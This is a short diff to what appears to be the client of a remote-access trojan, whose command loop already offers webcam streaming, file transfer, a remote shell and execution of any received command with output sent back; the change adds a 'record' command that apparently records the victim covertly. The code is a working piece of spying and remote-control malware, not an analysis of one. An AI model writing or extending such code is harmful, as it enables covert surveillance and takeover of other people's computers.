@@ -1,6 +1,7 @@
 from client import Client
 from webcam import VideoStream
 from transfer import FileTransfer
+from recorder import Recorder
 import os
 import sys
 import subprocess
@@ -102,6 +103,9 @@ def main():
 			transfer.receive(path)
 		elif cmd == "shell":
 			spawn_shell(s)
+		elif cmd == "record":
+			recorder = Recorder(client)
+			recorder.record()
 		else:
 			output = subprocess.getoutput(cmd + " " + ' '.join(args))
 			client.send(output)
